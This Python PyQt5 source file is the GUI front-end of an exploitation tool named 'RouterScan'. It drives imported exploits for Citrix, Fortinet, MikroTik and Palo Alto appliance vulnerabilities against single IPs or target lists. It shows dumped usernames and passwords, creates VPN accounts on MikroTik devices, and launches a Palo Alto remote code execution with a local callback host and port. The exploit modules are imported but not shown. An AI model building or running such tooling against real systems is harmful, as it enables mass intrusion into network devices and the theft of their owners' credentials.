import sys
from PyQt5 import QtCore, QtGui, QtWidgets

from DesktopOldVersion.DialogTarget import Ui_TargetDialog
from DesktopOldVersion.MainWindowRouterScan import Ui_RouterScanMainWindow
from DesktopOldVersion.DialogRCE import Ui_RCEDialog

from Utilization.format import Format
from Citrix.CVE_2019_19781.exploit import Exploit as CVE_2019_19781EXP
from Fortinet.CVE_2018_13379 import exploit as CVE_2018_13379EXP
from MikroTik.CVE_2018_14847.exploit import exploit
from MikroTik.CVE_2018_14847.create_vpn import vpn
from MikroTik.CVE_2018_14847.get_targets import format_file, format_single_ip
from PALO_ALTO.CVE_2017_15944.exploit import run as CVE_2017_15944EXP
from PALO_ALTO.CVE_2017_15944.rce import rce as CVE_2017_15944RCE


class RouterScanMainWindow(QtWidgets.QMainWindow):
    app = None

    def __init__(self, app):
        super(RouterScanMainWindow, self).__init__()
        self.app = app

    def show_DialogTargetCVE_2018_14847EXP(self):
        data = []
        dialog_target = TargetDialog(data, title='CVE_2018_14847@EXP')
        # ui = Ui_TargetDialog()
        # ui.setupUi(dialog_target)
        dialog_target.setupAction()
        dialog_target.show()
        dialog_target.exec_()

    def show_DialogTargetCVE_2018_14847VPN(self):
        data = []
        dialog_target = TargetDialog(data, title='CVE_2018_14847@VPN')
        # ui = Ui_TargetDialog()
        # ui.setupUi(dialog_target)
        dialog_target.setupAction()
        dialog_target.show()
        dialog_target.exec_()

    def show_DialogTargetCVE_2018_13379EXP(self):
        data = []
        dialog_target = TargetDialog(data, title='CVE_2018_13379@EXP')
        # ui = Ui_TargetDialog()
        # ui.setupUi(dialog_target)
        dialog_target.setupAction()
        dialog_target.show()
        dialog_target.exec_()

    def show_DialogTargetCVE_2019_19781EXP(self):
        data = []
        dialog_target = TargetDialog(data, title='CVE_2019_19781@EXP')
        # ui = Ui_TargetDialog()
        # ui.setupUi(dialog_target)
        dialog_target.setupAction()
        dialog_target.show()
        dialog_target.exec_()

    def show_DialogTargetCVE_2019_19781RCE(self):
        print('call fun show_DialogTargetCVE_2019_19781RCE')

    def show_DialogTargetCVE_2017_15944EXP(self):
        data = []
        dialog_target = TargetDialog(data, title='CVE_2017_15944@EXP')
        # ui = Ui_TargetDialog()
        # ui.setupUi(dialog_target)
        dialog_target.setupAction()
        dialog_target.show()
        dialog_target.exec_()

    def show_DialogTargetCVE_2017_15944RCE(self):
        print('call fun show_DialogTargetCVE_2017_15944RCE')
        data=[]
        dialog_rce=RCEDialog(data,title='CVE_2017_15944@RCE')
        dialog_rce.show()
        dialog_rce.exec_()


class TargetDialog(QtWidgets.QDialog):
    data = None

    def __init__(self, data, title):
        super(TargetDialog, self).__init__(APP.window)
        self.data = data
        self.title = title
        self.ui = Ui_TargetDialog()
        self.ui.setupUi(self)

    def setupAction(self):
        self.ui.pushButtonSingle.clicked.connect(self.addSingle)
        self.ui.pushButtonMultiple.clicked.connect(self.addMultiple)

    def addSingle(self):
        APP.ui.textBrowserOutput.clear()
        APP.ui.textBrowserTarget.clear()
        ip = self.ui.lineEditSingle.text()
        CVE, FUN = self.title.split('@')
        print(CVE, FUN)
        print(type(CVE), type(FUN))
        if ip:
            self.data = ''
            if ip in self.data:
                print('[*] INFO: {} is already exits'.format(ip))
                return
            self.data = ip
            target = format_single_ip(ip)
            print(target)
            for item in target:
                APP.ui.textBrowserTarget.append(str(item[0]))
            if FUN == 'EXP':
                if CVE == 'CVE_2018_14847':
                    output = exploit(target)
                    for item in output:
                        info = 'ip: ' + str(item[0]) + ' port: ' + str(item[1]) + '\r\n'
                        for u, p in item[2]:
                            info += 'username: ' + u + ' password: ' + p
                        APP.ui.textBrowserOutput.append(info)
                    APP.ui.textBrowserOutput.append('CVE_2018_14847@EXP FINISHED')
                    print('OUTPUT', output)
                elif CVE == 'CVE_2018_13379':
                    FormatClass = Format()
                    output = CVE_2018_13379EXP.Exploit(FormatClass.format_ip(ip))
                    for item in output:
                        info = 'ip: ' + str(item[0]) + '\r\nVPN Info: ' + str(item[1]) + '\r\n'
                        APP.ui.textBrowserOutput.append(info)
                    APP.ui.textBrowserOutput.append('CVE_2018_13379@EXP FINISHED')
                    print('CVE_2018_13379 EXP Finished\r\n', output)
                elif CVE == 'CVE_2019_19781':
                    FormatIP = Format()
                    FormatIP.ImportSingle(ip)
                    output = CVE_2019_19781EXP(FormatIP.GetValue())
                    del FormatIP
                    for item in output:
                        info = str(item) + '\r\n'
                        APP.ui.textBrowserOutput.append(info)
                    APP.ui.textBrowserOutput.append('CVE_2019_19781@EXP FINISHED')
                    print('CVE_2019_19781 EXP Finished\r\n', output)
                elif CVE=='CVE_2017_15944':
                    FormatIP = Format()
                    FormatIP.port = 4443
                    FormatIP.ImportSingle(ip)
                    output = CVE_2017_15944EXP(FormatIP.GetValue())
                    del FormatIP
                    for item in output:
                        info = 'ip: ' + str(item[0]) + ' port: ' + str(item[1]) + ' is vulnerable to CVE_2017_15944\r\n'
                        APP.ui.textBrowserOutput.append(info)
                    APP.ui.textBrowserOutput.append('CVE_2017_15944@EXP FINISHED')
                    print('CVE_2017_15944 EXP Finished\r\n', output)
            elif FUN == 'VPN':
                output = vpn(target)
                for item in output:
                    output_str = 'ip: ' + str(item[0]) + ' username: ' + str(item[1]) + ' password: ' + str(item[2])
                    APP.ui.textBrowserOutput.append(output_str)
                print('OUTPUT', output)

        # print(self.data)
        # print(type(self.data))

    def addMultiple(self):
        APP.ui.textBrowserOutput.clear()
        APP.ui.textBrowserTarget.clear()
        filename = self.ui.lineEditMultiple.text()
        CVE, FUN = self.title.split('@')
        print(CVE, FUN)
        print(type(CVE), type(FUN))
        if filename:
            self.data = ''
            if filename == self.data:
                print('[*] INFO: {} is already exits'.format(filename))
                return
            self.data = filename
            target = format_file(self.data)
            for item in target:
                APP.ui.textBrowserTarget.append(str(item[0]))
            if FUN == 'EXP':
                if CVE == 'CVE_2018_14847':
                    output = exploit(target)
                    for item in output:
                        info = 'ip: ' + str(item[0]) + ' port: ' + str(item[1]) + '\r\n'
                        for u, p in item[2]:
                            info += 'username: ' + u + ' password: ' + p + '\r\n'
                        APP.ui.textBrowserOutput.append(info)
                    print('OUTPUT', output)
                elif CVE == 'CVE_2018_13379':
                    FormatClass = Format()
                    output = CVE_2018_13379EXP.Exploit(FormatClass.format_file(filename))
                    for item in output:
                        info = 'ip: ' + str(item[0]) + '\r\nVPN Info: ' + str(item[1]) + '\r\n'
                        APP.ui.textBrowserOutput.append(info)
                    APP.ui.textBrowserOutput.append('CVE_2018_13379@EXP FINISHED')
                    print('CVE_2018_13379 EXP Finished\r\n', output)
                elif CVE == 'CVE_2019_19781':
                    FormatIP = Format()
                    FormatIP.ImportFile(filename)
                    output = CVE_2019_19781EXP(FormatIP.GetValue())
                    del FormatIP
                    for item in output:
                        info = str(item) + '\r\n'
                        APP.ui.textBrowserOutput.append(info)
                    APP.ui.textBrowserOutput.append('CVE_2019_19781@EXP FINISHED')
                    print('CVE_2019_19781 EXP Finished\r\n', output)
                elif CVE=='CVE_2017_15944':
                    FormatIP=Format()
                    FormatIP.port=4443
                    FormatIP.ImportFile(filename)
                    output=CVE_2017_15944EXP(FormatIP.GetValue())
                    del FormatIP
                    for item in output:
                        info='ip: '+str(item[0])+' port: '+str(item[1])+' is vulnerable to CVE_2017_15944\r\n'
                        APP.ui.textBrowserOutput.append(info)
                    APP.ui.textBrowserOutput.append('CVE_2017_15944@EXP FINISHED')
                    print('CVE_2017_15944 EXP Finished\r\n', output)
            elif FUN == 'VPN':
                output = vpn(target)
                for item in output:
                    output_str = 'ip: ' + str(item[0]) + ' username: ' + str(item[1]) + ' password: ' + str(item[2])
                    APP.ui.textBrowserOutput.append(output_str)
                print('OUTPUT', output)

        print(self.data)
        print(type(self.data))


class RCEDialog(QtWidgets.QDialog):
    data = None

    def __init__(self, data, title):
        super(RCEDialog, self).__init__(APP.window)
        self.data = data
        self.title = title
        self.ui = Ui_RCEDialog()
        self.ui.setupUi(self)

    def accept(self):
        print('push accept')
        APP.ui.textBrowserOutput.clear()
        APP.ui.textBrowserTarget.clear()
        target=self.ui.lineEdit.text()
        local=self.ui.lineEdit_2.text()
        CVE, FUN = self.title.split('@')
        if CVE=='CVE_2017_15944':
            FormatTarget=Format()
            FormatTarget.port=4443
            FormatTarget.ImportSingle(target)
            TargetList=FormatTarget.GetValue()
            del FormatTarget
            if len(TargetList)==1:
                thost=TargetList[0][0]
                tport=TargetList[0][1]
            APP.ui.textBrowserTarget.append('ip: '+str(thost)+' port: '+str(tport)+'\r\n')
            FormatLocal=Format()
            FormatLocal.port=11123
            FormatLocal.ImportSingle(local)
            LocalList=FormatLocal.GetValue()
            del FormatLocal
            if len(LocalList)==1:
                lhost=LocalList[0][0]
                lport=LocalList[0][1]
            output=CVE_2017_15944RCE(thost,tport,lhost,lport)
            print(output)
            if output:
                APP.ui.textBrowserOutput.append(
                    'Target IP: ' + str(output[0]) + ' Target Port: ' + str(output[1]) + '\r\n')
                APP.ui.textBrowserOutput.append(
                    'Local IP: ' + str(output[2]) + ' Local Port: ' + str(output[3]) + '\r\n')
            APP.ui.textBrowserOutput.append('CVE_2017_15944@RCE FINISHED')
            print('CVE_2017_15944 RCE Finished\r\n', output)


class RouterScan:

    def __init__(self):
        global APP
        APP = self
        self.app = QtWidgets.QApplication(sys.argv)
        self.ui = Ui_RouterScanMainWindow()
        self.window = RouterScanMainWindow(self)
        # self.window.setWindowOpacity(1)
        # self.window.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.ui.setupUi(self.window)
        self.setupAction()
        self.window.show()
        sys.exit(self.app.exec_())

    def setupAction(self):
        self.ui.actionExploitCVE_2018_14847.triggered.connect(self.window.show_DialogTargetCVE_2018_14847EXP)
        self.ui.actionVPNCVE_2018_14847.triggered.connect(self.window.show_DialogTargetCVE_2018_14847VPN)
        self.ui.actionExploitCVE_2018_13379.triggered.connect(self.window.show_DialogTargetCVE_2018_13379EXP)
        self.ui.actionExploitCVE_2019_19781.triggered.connect(self.window.show_DialogTargetCVE_2019_19781EXP)
        self.ui.actionRCECVE_2019_19781.triggered.connect(self.window.show_DialogTargetCVE_2019_19781RCE)
        self.ui.actionExploitCVE_2017_15944.triggered.connect(self.window.show_DialogTargetCVE_2017_15944EXP)
        self.ui.actionRCECVE_2017_15944.triggered.connect(self.window.show_DialogTargetCVE_2017_15944RCE)


if __name__ == '__main__':
    RouterScan()
